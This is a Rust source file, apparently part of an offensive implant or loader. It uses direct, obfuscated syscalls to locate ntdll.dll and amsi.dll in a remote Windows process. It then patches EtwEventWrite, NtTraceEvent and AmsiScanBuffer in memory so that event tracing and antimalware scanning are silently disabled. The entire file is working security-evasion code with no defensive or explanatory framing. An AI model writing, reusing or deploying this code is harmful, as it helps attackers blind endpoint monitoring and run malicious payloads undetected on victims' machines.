use windows::Win32::Foundation::HANDLE;

use dinvk::syscall;

use std::ffi::c_void;

#[repr(C)]
struct PEB_LDR_DATA {
    _reserved1: [u8; 8],
    _reserved2: [*mut c_void; 3],
    in_memory_order_module_list: LIST_ENTRY,
}

#[repr(C)]
struct LIST_ENTRY {
    flink: *mut LIST_ENTRY,
    blink: *mut LIST_ENTRY,
}

#[repr(C)]
struct LDR_DATA_TABLE_ENTRY {
    _reserved1: [*mut c_void; 2],
    in_memory_order_links: LIST_ENTRY,
    _reserved2: [*mut c_void; 2],
    dll_base: *mut c_void,
    _reserved3: [*mut c_void; 2],
    full_dll_name: UNICODE_STRING,
    base_dll_name: UNICODE_STRING,
}

#[repr(C)]
struct UNICODE_STRING {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct PROCESS_BASIC_INFORMATION {
    _reserved1: *mut c_void,
    peb_base_address: *mut c_void,
    _reserved2: [*mut c_void; 2],
    unique_process_id: usize,
    _reserved3: *mut c_void,
}

const STATUS_SUCCESS: i32 = 0;

pub unsafe fn g_remote_module_base(h_process: HANDLE, module_name: &str) -> Option<usize> {
    let mut pbi: PROCESS_BASIC_INFORMATION = std::mem::zeroed();
    let mut return_length: u32 = 0;

    let status = syscall!(
        "NtQueryInformationProcess",
        h_process.0,
        0,
        &mut pbi as *mut _ as *mut c_void,
        std::mem::size_of::<PROCESS_BASIC_INFORMATION>(),
        &mut return_length
    )?;

    if status != STATUS_SUCCESS {
        return None;
    }

    let mut peb_bytes = vec![0u8; 0x380];
    let mut bytes_read: usize = 0;

    let status = syscall!(
        "NtReadVirtualMemory",
        h_process.0,
        pbi.peb_base_address,
        peb_bytes.as_mut_ptr() as *mut c_void,
        peb_bytes.len(),
        &mut bytes_read
    )?;

    if status != STATUS_SUCCESS {
        return None;
    }

    let ldr_ptr = *(peb_bytes.as_ptr().add(0x18) as *const usize);

    let mut ldr_data: PEB_LDR_DATA = std::mem::zeroed();
    let status = syscall!(
        "NtReadVirtualMemory",
        h_process.0,
        ldr_ptr as *mut c_void,
        &mut ldr_data as *mut _ as *mut c_void,
        std::mem::size_of::<PEB_LDR_DATA>(),
        &mut bytes_read
    )?;

    if status != STATUS_SUCCESS {
        return None;
    }

    let mut current = ldr_data.in_memory_order_module_list.flink;
    let head = &ldr_data.in_memory_order_module_list as *const _ as *mut LIST_ENTRY;

    let module_name_lower = module_name.to_lowercase();
    let mut walked = 0usize;

    loop {
        if current == head || current.is_null() {
            break;
        }
        walked += 1;
        if walked > 512 {
            break;
        }

        let entry_addr = (current as usize - std::mem::offset_of!(LDR_DATA_TABLE_ENTRY, in_memory_order_links)) as *mut c_void;
        let mut entry: LDR_DATA_TABLE_ENTRY = std::mem::zeroed();

        let status = syscall!(
            "NtReadVirtualMemory",
            h_process.0,
            entry_addr,
            &mut entry as *mut _ as *mut c_void,
            std::mem::size_of::<LDR_DATA_TABLE_ENTRY>(),
            &mut bytes_read
        )?;

        if status != STATUS_SUCCESS {
            break;
        }

        if !entry.base_dll_name.buffer.is_null() && entry.base_dll_name.length > 0 {
            let name_len = entry.base_dll_name.length as usize / 2;
            let mut name_buf = vec![0u16; name_len + 1];

            let status = syscall!(
                "NtReadVirtualMemory",
                h_process.0,
                entry.base_dll_name.buffer as *mut c_void,
                name_buf.as_mut_ptr() as *mut c_void,
                entry.base_dll_name.length as usize,
                &mut bytes_read
            )?;

            if status == STATUS_SUCCESS {
                if let Ok(name) = String::from_utf16(&name_buf[..name_len]) {
                    if name.to_lowercase() == module_name_lower {
                        return Some(entry.dll_base as usize);
                    }
                }
            }
        }

        current = entry.in_memory_order_links.flink;
    }

    None
}

pub unsafe fn g_remote_export(h_process: HANDLE, module_base: usize, export_name: &str) -> Option<usize> {
    let mut dos_header = vec![0u8; 64];
    let mut bytes_read: usize = 0;

    let status = syscall!(
        "NtReadVirtualMemory",
        h_process.0,
        module_base as *mut c_void,
        dos_header.as_mut_ptr() as *mut c_void,
        64,
        &mut bytes_read
    )?;

    if status != STATUS_SUCCESS || dos_header[0] != b'M' || dos_header[1] != b'Z' {
        return None;
    }

    let e_lfanew = u32::from_le_bytes([dos_header[0x3C], dos_header[0x3D], dos_header[0x3E], dos_header[0x3F]]) as usize;

    let mut nt_headers = vec![0u8; 0x108];
    let status = syscall!(
        "NtReadVirtualMemory",
        h_process.0,
        (module_base + e_lfanew) as *mut c_void,
        nt_headers.as_mut_ptr() as *mut c_void,
        0x108,
        &mut bytes_read
    )?;

    if status != STATUS_SUCCESS {
        return None;
    }

    let export_dir_rva = u32::from_le_bytes([
        nt_headers[0x88], nt_headers[0x89], nt_headers[0x8A], nt_headers[0x8B]
    ]) as usize;

    if export_dir_rva == 0 {
        return None;
    }

    let mut export_dir = vec![0u8; 40];
    let status = syscall!(
        "NtReadVirtualMemory",
        h_process.0,
        (module_base + export_dir_rva) as *mut c_void,
        export_dir.as_mut_ptr() as *mut c_void,
        40,
        &mut bytes_read
    )?;

    if status != STATUS_SUCCESS {
        return None;
    }

    let num_names = u32::from_le_bytes([export_dir[24], export_dir[25], export_dir[26], export_dir[27]]) as usize;
    let names_rva = u32::from_le_bytes([export_dir[32], export_dir[33], export_dir[34], export_dir[35]]) as usize;
    let ordinals_rva = u32::from_le_bytes([export_dir[36], export_dir[37], export_dir[38], export_dir[39]]) as usize;
    let functions_rva = u32::from_le_bytes([export_dir[28], export_dir[29], export_dir[30], export_dir[31]]) as usize;

    let names_size = num_names * 4;
    let mut names_table = vec![0u8; names_size];
    let status = syscall!(
        "NtReadVirtualMemory",
        h_process.0,
        (module_base + names_rva) as *mut c_void,
        names_table.as_mut_ptr() as *mut c_void,
        names_size,
        &mut bytes_read
    )?;

    if status != STATUS_SUCCESS {
        return None;
    }

    for i in 0..num_names {
        let name_rva_offset = i * 4;
        let name_rva = u32::from_le_bytes([
            names_table[name_rva_offset],
            names_table[name_rva_offset + 1],
            names_table[name_rva_offset + 2],
            names_table[name_rva_offset + 3],
        ]) as usize;

        let mut name_buf = vec![0u8; 256];
        let status = syscall!(
            "NtReadVirtualMemory",
            h_process.0,
            (module_base + name_rva) as *mut c_void,
            name_buf.as_mut_ptr() as *mut c_void,
            256,
            &mut bytes_read
        )?;

        if status != STATUS_SUCCESS {
            continue;
        }

        let name_len = name_buf.iter().position(|&b| b == 0).unwrap_or(256);
        if let Ok(name) = std::str::from_utf8(&name_buf[..name_len]) {
            if name == export_name {
                let mut ordinal_bytes = [0u8; 2];
                let status = syscall!(
                    "NtReadVirtualMemory",
                    h_process.0,
                    (module_base + ordinals_rva + i * 2) as *mut c_void,
                    ordinal_bytes.as_mut_ptr() as *mut c_void,
                    2,
                    &mut bytes_read
                )?;

                if status != STATUS_SUCCESS {
                    return None;
                }

                let ordinal = u16::from_le_bytes(ordinal_bytes) as usize;

                let mut func_rva_bytes = [0u8; 4];
                let status = syscall!(
                    "NtReadVirtualMemory",
                    h_process.0,
                    (module_base + functions_rva + ordinal * 4) as *mut c_void,
                    func_rva_bytes.as_mut_ptr() as *mut c_void,
                    4,
                    &mut bytes_read
                )?;

                if status != STATUS_SUCCESS {
                    return None;
                }

                let func_rva = u32::from_le_bytes(func_rva_bytes) as usize;
                return Some(module_base + func_rva);
            }
        }
    }

    None
}

pub unsafe fn p_remote_etw(h_process: HANDLE) -> bool {
    use crate::internal_api::{n_protect_virtual_memory_syscall, n_write_virtual_memory_syscall};

    let ntdll_base = match g_remote_module_base(h_process, &*obfstr::obfstr!("ntdll.dll")) {
        Some(b) => b,
        None => return false,
    };

    let patch: [u8; 3] = [0x33, 0xC0, 0xC3];
    let mut patched = false;

    for export_name in [&*obfstr::obfstr!("EtwEventWrite"), &*obfstr::obfstr!("NtTraceEvent")] {
        let addr = match g_remote_export(h_process, ntdll_base, export_name) {
            Some(a) => a as *mut c_void,
            None => continue,
        };

        let mut existing: [u8; 3] = [0u8; 3];
        let mut nr: usize = 0;
        let _ = syscall!(
            "NtReadVirtualMemory",
            h_process.0,
            addr,
            existing.as_mut_ptr() as *mut c_void,
            3usize,
            &mut nr
        );
        if existing == [0x33, 0xC0, 0xC3] {
            patched = true;
            continue;
        }

        let mut old_prot: u32 = 0;
        let mut base = addr;
        let mut size = patch.len();
        let s = n_protect_virtual_memory_syscall(
            h_process,
            &mut base as *mut *mut c_void,
            &mut size,
            0x40,
            &mut old_prot,
        );
        if s.0 != 0 { continue; }

        let mut written: usize = 0;
        let _ = n_write_virtual_memory_syscall(
            h_process,
            addr,
            patch.as_ptr() as *mut c_void,
            patch.len(),
            &mut written,
        );

        let mut dummy: u32 = 0;
        base = addr;
        size = patch.len();
        let _ = n_protect_virtual_memory_syscall(
            h_process,
            &mut base as *mut *mut c_void,
            &mut size,
            old_prot,
            &mut dummy,
        );

        patched = true;
    }

    patched
}

pub unsafe fn p_remote_amsi(h_process: HANDLE) -> bool {
    use crate::internal_api::{n_protect_virtual_memory_syscall, n_write_virtual_memory_syscall};

    let amsi_base = match g_remote_module_base(h_process, &*obfstr::obfstr!("amsi.dll")) {
        Some(b) => b,
        None => return true,
    };

    let addr = match g_remote_export(h_process, amsi_base, &*obfstr::obfstr!("AmsiScanBuffer")) {
        Some(a) => a as *mut c_void,
        None => return false,
    };

    let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

    let mut old_prot: u32 = 0;
    let mut base = addr;
    let mut size = patch.len();
    let s = n_protect_virtual_memory_syscall(
        h_process,
        &mut base as *mut *mut c_void,
        &mut size,
        0x40,
        &mut old_prot,
    );
    if s.0 != 0 { return false; }

    let mut written: usize = 0;
    let _ = n_write_virtual_memory_syscall(
        h_process,
        addr,
        patch.as_ptr() as *mut c_void,
        patch.len(),
        &mut written,
    );

    let mut dummy: u32 = 0;
    base = addr;
    size = patch.len();
    let _ = n_protect_virtual_memory_syscall(
        h_process,
        &mut base as *mut *mut c_void,
        &mut size,
        old_prot,
        &mut dummy,
    );

    true
}
